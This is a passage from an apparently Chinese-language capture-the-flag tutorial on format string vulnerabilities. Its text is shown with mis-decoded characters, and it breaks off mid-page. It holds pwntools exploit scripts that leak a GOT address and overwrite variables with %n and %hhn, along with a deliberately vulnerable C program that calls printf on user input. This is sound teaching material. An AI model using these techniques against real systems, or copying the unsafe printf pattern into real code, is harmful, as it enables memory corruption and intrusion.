class="line">%n$x</span><br></pre></td></tr></table></figure><br>è¿˜æ˜¯é€šè¿‡gdbæ‰“å¼€ç¨‹åºï¼Œåœ¨printfå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œæ¥ä¸‹æ¥è¾“å…¥rè¿è¡Œèµ·æ¥ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„å…¬å¼è¾“å…¥%3$x<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/leakmemory/leakmemory </span><br><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure><br>ä¾æ—§è¾“å…¥cä¼šæ‰“å°å‡ºâ€œ<code>00000001.22222222.ffffffff.%3$x</code>â€ï¼Œå¹¶ä¸”ç¨‹åºè¿˜ä¼šåœåœ¨ç¬¬äºŒä¸ªprintfå‡½æ•°å¤„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦çœ‹ä¸€ä¸‹æ ˆç©ºé—´äº†<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183920.png" alt="Pasted image 20250210183920"><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„<code>%3$x</code>è¢«æ”¾ç½®åˆ°äº†printfå‡½æ•°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œä¸€ä¼šæˆ‘ä»¬å†è®²ä¸ºä»€ä¹ˆè¦è¾“å…¥ <code>%3$x</code>ã€‚æ¥ä¸‹æ¥è¾“å…¥cçœ‹ä¸€çœ‹æ‰“å°çš„ç»“æœ<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211150946.png" alt="Pasted image 20250211150946"><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å‡ºçš„æ˜¯1ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„0x1ï¼Œæ‰€ä»¥è¯´<code>%3$x</code>è§£æçš„æ˜¯0x1ã€‚é‚£ä¹ˆå°±éœ€è¦ä»”ç»†ç¢ç£¨ä¸€ä¸‹æˆ‘ä»¬è¾“å…¥çš„<code>%3$x</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151008.png" alt="Pasted image 20250211151008"><br><strong>äº‹å®ä¸Šæˆ‘ä»¬é€šè¿‡<code>%3$x</code>è¾“å‡ºçš„0x1æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„%3$xå°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ„æ€</strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151023.png" alt="Pasted image 20250211151023"><br><strong>ä½†æ˜¯æˆ‘ä»¬å®é™…ä¸Šè¾“å‡ºçš„æ˜¯printfçš„ç¬¬å››ä¸ªå‚æ•°ï¼Œå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ˜¯printfå‡½æ•°çš„å…¶ä¸­ä¸€ä¸ªå‚æ•°ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸ç”¨éå†æ•´ä¸ªæ ˆï¼Œèƒ½å¤ŸæŒ‡å®šè¾“å‡ºæŸä¸ªæ ˆä¸Šçš„å†…å®¹</strong></p><h4 id="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"><a href="#è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²" class="headerlink" title="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"></a>è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²</h4><p>å…¶å®å°±æ˜¯æŠŠå‰é¢æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„xæ”¹æˆså°±å¯ä»¥äº†ï¼Œ%sä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºæ ˆåœ°å€ä¸­çš„å†…å®¹ï¼ŒéªŒè¯è¿‡ç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼Œå°±ä¸å†™äº†<br><strong>å°æŠ€å·§æ€»ç»“</strong></p><blockquote><p>åˆ©ç”¨ %x æ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œ<strong>ä½†å»ºè®®ä½¿ç”¨ %pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«</strong>ã€‚<br>åˆ©ç”¨ %s æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡<strong>æœ‰é›¶æˆªæ–­</strong>ã€‚<br>åˆ©ç”¨ <code>%order$x</code> æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ %order$s æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</p><h4 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h4><p>æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦æ³„éœ²æŸä¸ªlibcå‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œä»è€Œçš„åˆ°å…¶åœ°å€ï¼Œè¿›è€Œè·å–libcç‰ˆæœ¬ä»¥åŠå…¶ä»–å‡½æ•°çš„åœ°å€ï¼Œè¿™æ—¶å€™èƒ½å¤Ÿå®Œå…¨æ§åˆ¶æ³„éœ²æŸä¸ªæŒ‡å®šåœ°å€çš„å†…å­˜å°±å¾ˆé‡è¦äº†ã€‚<strong>ä¸€èˆ¬æ¥è¯´åœ¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ä¸­ï¼Œæˆ‘ä»¬è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½åœ¨æ ˆä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å…¶å®å°±æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€</strong><br>ç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå‡è®¾æ”¹æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å¯¹å‡½æ•°è°ƒç”¨ä¸ºç¬¬Kä¸ªå‚æ•°ã€‚é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹ çš„æ–¹å¼æ¥è·å–æŸä¸ªæŒ‡å®šåœ°å€addrçš„å†…å®¹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><br>ä¸‹é¢å°±æ˜¯å¦‚ä½•ç¡®å®šè¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºç¬¬å‡ ä¸ªå‚æ•°çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç¡®å®š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ tag ]%p%p%p%p%p%p%p%p%p%p%p%p.......</span><br></pre></td></tr></table></figure><br>[tag]ä¸ºé‡å¤æŸä¸ªå­—ç¬¦çš„å­—èŠ‚é•¿æ¥ä½œä¸ºtagï¼Œå°±æ˜¯aaaaã€bbbbè¿™æ ·å°±å¯ä»¥ã€‚åé¢ä¸ª%pä¼šå°†ä¾æ¬¡éå†ä»¥åœ°å€çš„å½¢å¼æ‰“å°å‡ºå‡½æ•°å‚æ•°ï¼Œè¯•ä¸€ä¸‹ï¼š<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151337.png" alt="Pasted image 20250211151337"><br>æˆ‘ä»¬è¾“å…¥çš„AAAAå¯¹åº”åé¢åˆ°0x41414141ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å››ä¸ªå‚æ•°ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å‰é¢çš„æ–¹æ³•ï¼š</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%<span class="number">4</span>$p</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³ï¼Œå¦‚æœå°†AAAAæ›¿æ¢æˆæŸä¸ªå‡½æ•°çš„gotåœ°å€ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šæ‰“å°å‡ºè¿™ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ã€‚æˆ‘ä»¬æ‹¿scanfå‡½æ•°ä¸¾ä¾‹ï¼Œè·å–å‡½æ•°gotåœ°å€å°±äº¤ç»™æˆ‘ä»¬çš„pwntoolsäº†ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>] #è·å–<span class="built_in">scanf</span>å‡½æ•°çš„gotåœ°å€</span><br><span class="line">print hex(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span> #å°†AAAA%<span class="number">4</span>$pä¸­çš„Aæ›¿æ¢æˆ<span class="built_in">scanf</span>å‡½æ•°çš„gotåœ°å€</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line">print hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151436.png" alt="Pasted image 20250211151436"></p><h3 id="3-è¦†ç›–å†…å­˜"><a href="#3-è¦†ç›–å†…å­˜" class="headerlink" title="3. è¦†ç›–å†…å­˜"></a>3. è¦†ç›–å†…å­˜</h3><p>å‰é¢æˆ‘ä»¬é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²æ ˆå†…å­˜ä»¥åŠä»»æ„åœ°å€å†…å­˜ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†æˆ‘ä»¬ç›´æ¥ä¿®æ”¹æ ˆä¸Šå˜é‡çš„å€¼ã€‚æƒ³è¦è¿›è¡Œè¦†ç›–ï¼ŒåŠ¿å¿…è¦æœ‰ä¸€ä¸ªä¸œè¥¿èƒ½æœ‰å†™çš„èƒ½åŠ›ã€‚è¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†%n<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n,ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</span><br></pre></td></tr></table></figure><br>â€¦[ overwrite addr ]â€¦.%[ overwrite offset ]$n<br>**å…¶ä¸­â€¦ è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œoverwrite addr è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œoverwrite offset åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåˆ©ç”¨åˆ†ä¸ºä»¥ä¸‹çš„æ­¥éª¤ï¼š<br>â€¢ ç¡®å®šè¦†ç›–åœ°å€<br>â€¢ ç¡®å®šç›¸å¯¹åç§»ï¼ˆæ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ç¬¬å‡ ä¸ªå‚æ•°ï¼‰<br>â€¢ è¿›è¡Œè¦†ç›–</p><p>ä¸¾ä¾‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ç®€å•çš„è®²ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼Œä¸‰ä¸ªæ•´å‹å˜é‡a=123ã€b=456ã€c=789ã€‚aã€bæ˜¯å…¨å±€å˜é‡ï¼Œcæ˜¯å±€éƒ¨å˜é‡ï¼Œæ•°ç»„sç­‰å¾…æˆ‘ä»¬ä»scanfå‡½æ•°è¾“å…¥ã€‚å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°ç¬¬äºŒä¸ªprintfå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æœ€åæ˜¯ä¸‰ä¸ªåˆ¤æ–­ï¼Œå¦‚æœc = 16å°±æ‰“å°â€œmodified c.â€ï¼Œå¦‚æœa = 2å°±æ‰“å°â€œmodified a for a small number.â€ï¼Œå¦‚æœb = 0x12345678å°±æ‰“å°â€œmodified b for a big number!â€</p><h4 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h4><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©è®©c = 16ï¼Œä½¿ç¨‹åºæ‰“å°â€œmodified c.â€ï¼Œå¯ä»¥ä»æºç ä¸­çœ‹åˆ°ç¬¬ä¸€æ¬¡printfæ‰“å°å‡ºäº†å˜é‡cçš„åœ°å€ï¼Œæ‰€ä»¥ä¸éœ€è¦é¢å¤–æ‰¾äº†<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152005.png" alt="Pasted image 20250211152005"><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»“æœçœ‹åˆ°å˜é‡s(cçš„åœ°å€)æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ ¹æ®ä¸Šé¢çš„å…¬å¼æ¥æ„é€ payloadäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">c_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) <span class="comment">#è·å–cå˜é‡çš„åœ°å€</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c_addr)</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;%6$n&#x27;</span> <span class="comment">#æ„å»ºpayload</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç¬¬ä¸€ä¸ªc_addrå°±æ˜¯å˜é‡cçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡æ¥æ”¶ç¬¬ä¸€æ¬¡printfæ‰“å°å‡ºæ¥çš„å­—ç¬¦è·å¾—ã€‚å› ä¸ºå‰é¢çš„c_addrå·²ç»å äº†4ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒä¸ª%012dæ˜¯ä¸ºäº†è¡¥å…¨16ä¸ªå­—èŠ‚ï¼Œæœ€åçš„%6$næ˜¯ä¸ºäº†å‘ç¬¬6ä¸ªå‚æ•°å†…å†™16ï¼Œè¿™ä¸ª16å°±æ˜¯å‰é¢çš„16ä¸ªå­—èŠ‚ã€‚è¿™å°±æ˜¯%nçš„èƒ½åŠ›<br>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºçš„â€œmodified c.â€å­—ç¬¦ä¸²ï¼š<img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152220.png" alt="Pasted image 20250211152220"></p><h4 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h4><h5 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h5><p>è¿™ä¸ªå°æ˜¯ä»€ä¹ˆå°å‘¢ï¼Œæ˜¯å°äºæœºå™¨å­—é•¿çš„æ•°å­—ã€‚æ‹¿2ä¸¾ä¾‹å­ï¼Œå¦‚æœæˆ‘æƒ³å‘å˜é‡ä¸­å­˜ä¸€ä¸ª2ï¼Œé‚£å°±ä¼šå‡ºç°é—®é¢˜ï¼Œå›æƒ³ä¸€ä¸‹åˆšåœ¨æˆ‘ä»¬åšçš„ä¾‹å­ï¼Œ%nä¼šå°†å‰é¢è¾“å…¥çš„å­—èŠ‚æ•°å­˜æ”¾åˆ°æŒ‡å®šçš„å‚æ•°åœ°å€ä¸­ã€‚ä½†æ˜¯æˆ‘ä»¬å°†åœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œé‚£ä¹ˆç»è¿‡p32å°ç«¯åºè½¬åŒ–ä¹‹ååœ°å€æœ¬èº«å°±ä¼šå 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ç»è¿‡%nå­˜æ”¾çš„æ—¶å€™ï¼Œå‘å˜é‡ä¸­å†™çš„æ•°ä¸€å®šæ˜¯å¤§äºç­‰äº4çš„ï¼Œé‚£è¿™æ ·ä¸€æ¥æˆ‘ä»¬æƒ³å‘å˜é‡ä¸­å­˜æ”¾2çš„æƒ³æ³•å¯èƒ½å°±è¦ç ´ç­äº†ã€‚æˆ‘ä»¬æ‹¿a = 2ä¸¾ä¾‹ï¼Œä½¿ç¨‹åºè¾“å‡ºå­—ç¬¦ä¸²â€œmodified a for a small number.â€<br>ä½†æ˜¯æˆ‘ä»¬æƒ³ä¸€æƒ³ï¼Œåœ°å€ä¸€å®šè¦æ”¾åœ¨æœ€å‰é¢å—ï¼Œæˆ‘ä»¬çš„%næ˜¯å¯ä»¥å‘æŒ‡å®šçš„å‚æ•°åœ°å€å†™å…¥æ•°å­—çš„ï¼Œæ‰€ä»¥æŠŠåŸæœ‰çš„payloadè¯¥ä¸€ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%k&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æŠŠå‰é¢çš„å­—ç¬¦ä¸²æ‹†åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†å››ä¸ªå­—èŠ‚ï¼Œå› ä¸ºå˜é‡æ˜¯ä»ç¬¬å…­ä¸ªå‚æ•°å¼€å§‹çš„ï¼Œæ‰€ä»¥aa%kæ˜¯ç¬¬6ä¸ªã€$naaæ˜¯ç¬¬7ä¸ªã€p32(a_addr)æ˜¯ç¬¬8ä¸ªï¼Œæ‰€ä»¥kéœ€è¦æ”¹æˆ8ï¼Œè¿™æ ·%nå°±ä¼šå°†â€œaaâ€è¿™ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦æ•°2å†™åœ¨ç¬¬8ä¸ªå‚æ•°ï¼Œå³å˜é‡açš„åœ°å€ä¸­ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%8&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆè¿™æ ·ä¸€æ¥åç§»æ‰¾åˆ°äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯å˜é‡açš„åœ°å€äº†ï¼Œå› ä¸ºaå·²ç»è¿›è¡Œè¿‡åˆå§‹åŒ–äº†ï¼Œæ‰€ä»¥ä½¿ç”¨idaå¯ä»¥åœ¨.dataæ®µæ‰¾åˆ°ï¼š<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154330.png" alt="Pasted image 20250211154330"><br>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154405.png" alt="Pasted image 20250211154405"></p><h5 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h5><p>åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œåº”è¯¥å¯¹<code>%k$n</code>æœ‰ä¸€å®šçš„äº†è§£äº†ï¼Œè¿˜æ˜¯é‚£ä¸ªåŸåˆ™ï¼Œ%k$nå‰é¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±ä¼šå‘ç¬¬kä¸ªå‚æ•°åœ°å€ä¸­å†™å¤šå°‘ã€‚é‚£ä¹ˆå›æ¥ï¼Œè¦†ç›–å¤§æ•°å­—èƒ½æœ‰å¤šå¤§å‘¢ï¼Ÿæ‹¿b = 0x12345678ä¸¾ä¾‹ï¼Œæ¢æˆåè¿›åˆ¶çš„è¯å°±æ˜¯305419896ä¸ªå­—èŠ‚ï¼Œè¿™å°±å·²ç»éå¸¸å¤§äº†ï¼Œæˆ‘ä»¬æ²¡æ³•æ„å»ºä¸€ä¸ªè¶…çº§é•¿çš„payloadçš„æ’å…¥æ ˆä¸­ï¼Œå› ä¸ºæ ˆçš„é•¿åº¦å¯èƒ½éƒ½æ²¡æœ‰è¿™ä¹ˆé•¿ğŸ˜</p><p>é‚£ä¹ˆæˆ‘ä»¬æ”¹å˜ä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬ä¸€å®šè¦ä¸€æ¬¡æ€§å†™å…¥0x12345678å—ï¼Ÿå­˜æ”¾å˜é‡bçš„åœ°å€ç©ºé—´æœ‰4ä¸ªå­—èŠ‚ï¼š<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154435.png" alt="Pasted image 20250211154435"><br>å› ä¸ºåœ¨x86ã€x64ä¸­æ—¶æŒ‰ç…§å°ç«¯åºçš„å½¢å¼å­˜å‚¨çš„ï¼Œæ‰€ä»¥ä»¥b_addrä½œä¸ºåŸºåœ°å€å¼€å§‹ï¼Œä¾æ¬¡ä»å³å‘å·¦åœ¨æ¯ä¸ªå­—èŠ‚ä¸­å†™å…¥å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸å¿…é¡»ä¸€æ¬¡æ€§å°†å˜é‡bçš„æ‰€æœ‰ä½ç½®å¡«æ»¡ï¼Œå¯ä»¥ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„å¡«å……ã€‚è¿™æ ·å¡«å……çš„æ–¹æ³•å°±ç”¨åˆ°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„ä¸¤ä¸ªæ ‡å¿—ä½äº†ï¼š</p><blockquote><p>hï¼šå¯¹äºæ•´æ•°ç±»å‹ï¼Œprintf æœŸå¾…ä¸€ä¸ªä» short æå‡çš„ int å°ºå¯¸çš„æ•´å‹å‚æ•°<br>hhï¼šå¯¹äºæ•´å‹ç±»å‹ï¼Œprintf æœŸå¾…ä¸€ä¸ªä» char æå‡çš„ int å°ºå¯¸çš„æ•´å½¢å‚æ•°</p></blockquote><p>å®šä¹‰å¾ˆå¤æ‚ï¼Œç®€å•ç‚¹è¯´å¦‚æœæˆ‘ä»¬ä½¿ç”¨äº†hæ ‡å¿—ä½ï¼Œé‚£ä¹ˆå°±ä¼šå‘å˜é‡bä¸­ä¸€æ¬¡æ€§å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œå†™ä¸¤æ¬¡å¡«æ»¡ã€‚ä½¿ç”¨hhæ ‡å¿—ä½ä¼šå‘å˜é‡bä¸­ä¸€æ¬¡æ€§å†™ä¸€ä¸ªå­—èŠ‚ï¼Œå†™å››æ¬¡å¡«æ»¡ã€‚é‚£ä¹ˆæˆ‘ä»¬å»æƒ³ï¼Œå¦‚æœå°†b_addræ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å…­ä¸ªå‚æ•°ä½ç½®ã€b_addr + 1æ”¾åœ¨ç¬¬7ä¸ªå‚æ•°ä½ç½®ã€b_addr + 2æ”¾åœ¨ç¬¬8ä¸ªå‚æ•°ä½ç½®ã€b_addr + 3æ”¾åœ¨ç¬¬9ä¸ªå‚æ•°ä½ç½®ã€‚å†é€šè¿‡<code>%6$hhn</code>ã€<code>%7$hhn</code>ã€<code>%8$hhn</code>ã€<code>%9$hhn</code>å°†0x78ã€0x56ã€0x34ã€0x12å†™è¿›å»æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼<br><figure class="highlight python"><table><tr><td 